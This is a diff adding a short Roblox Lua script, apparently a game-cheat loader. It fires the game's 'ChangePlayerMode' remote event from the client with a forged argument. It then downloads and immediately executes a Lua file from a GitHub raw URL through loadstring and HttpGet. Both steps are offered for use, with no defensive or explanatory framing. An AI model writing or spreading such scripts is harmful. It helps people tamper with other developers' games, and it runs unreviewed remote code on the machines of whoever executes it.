@@ -1,0 +1,10 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+local remoteEvent = ReplicatedStorage:WaitForChild("Events", 10)
+	:WaitForChild("Player", 10)
+	:WaitForChild("ChangePlayerMode", 10)
+local args = { true }
+remoteEvent:FireServer(unpack(args))
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/M2Sky/celestialdevelopment/refs/heads/main/ev.lua", true))()
